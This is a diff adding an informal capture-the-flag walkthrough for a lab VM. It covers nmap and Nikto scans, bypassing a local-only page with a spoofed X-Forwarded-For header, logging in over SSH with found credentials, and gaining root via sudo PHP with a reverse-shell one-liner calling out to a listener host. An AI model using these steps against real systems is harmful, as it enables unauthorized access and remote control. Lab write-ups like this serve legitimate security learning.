@@ -1,0 +1,101 @@
+Gt the ip 
+
+an nmap scan gave us 
+
+Nmap scan report for 192.168.57.219
+Host is up (0.000091s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+MAC Address: 00:0C:29:4B:4C:28 (VMware)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Nikto scan gave us 
+
+/robots.txt
+/config
+/misc
+
+
+the index page is also ....there  we are suggested to use x-forwarded-for 
+
+Ok so we the pages can be accessed locally . 
+
+for which we need X-Forwarded-For:127.0.0.1
+
+to be send with every request made . 
+
+We go into burp suite add a header to the request 
+
+
+Now we can access the pages and we create a user 
+
+On the page we find that we can enumerate users 
+
+We found out Alice's password 
+
+The credentials are 
+
+alice 
+
+4lic3
+
+We ran intruder and tried to see the other users 
+
+Since the ssh is open 
+
+we try ssh alice@ip
+
+and we connect to alice 
+
+We see a .my_secret directory 
+
+and see the contents 
+
+First the flag 
+
+Greattttt my brother! You saw the Alice's note! Now you save the record information to give to bob! I know if it's given to him then Bob will be hurt but this is better than Bob cheated!
+
+Now your last job is get access to the root and read the flag ^_^
+
+Flag 1 : gfriEND{2f5f21b2af1b8c3e227bcf35544f8f09}
+
+
+Now the notes 
+
+Woahhh! I like this company, I hope that here i get a better partner than bob ^_^, hopefully Bob doesn't know my notes
+
+Too bad for bob ..
+
+
+Lets get the root 
+
+So we check for sudo -l 
+
+we see /usr/bin/php running on the server 
+
+So we decide to go for a reverse shell
+
+sudo /usr/bin/php -r '$s=fsockopen("192.168.57.203",9989);exec("/bin/sh -i<&3 >&3 2>&3");'
+
+getting a reverse shell as root 
+
+We get the second flag 
+
+  ________        __    ___________.__             ___________.__                ._.
+ /  _____/  _____/  |_  \__    ___/|  |__   ____   \_   _____/|  | _____     ____| |
+/   \  ___ /  _ \   __\   |    |   |  |  \_/ __ \   |    __)  |  | \__  \   / ___\ |
+\    \_\  (  <_> )  |     |    |   |   Y  \  ___/   |     \   |  |__/ __ \_/ /_/  >|
+ \______  /\____/|__|     |____|   |___|  /\___  >  \___  /   |____(____  /\___  /__
+        \/                              \/     \/       \/              \//_____/ \/
+
+Yeaaahhhh!! You have successfully hacked this company server! I hope you who have just learned can get new knowledge from here :) I really hope you guys give me feedback for this challenge whether you like it or not because it can be a reference for me to be even better! I hope this can continue :)
+
+Contact me if you want to contribute / give me feedback / share your writeup!
+Twitter: @makegreatagain_
+Instagram: @aldodimas73
+
+Thanks! Flag 2: gfriEND{56fbeef560930e77ff984b644fde66e7}
+
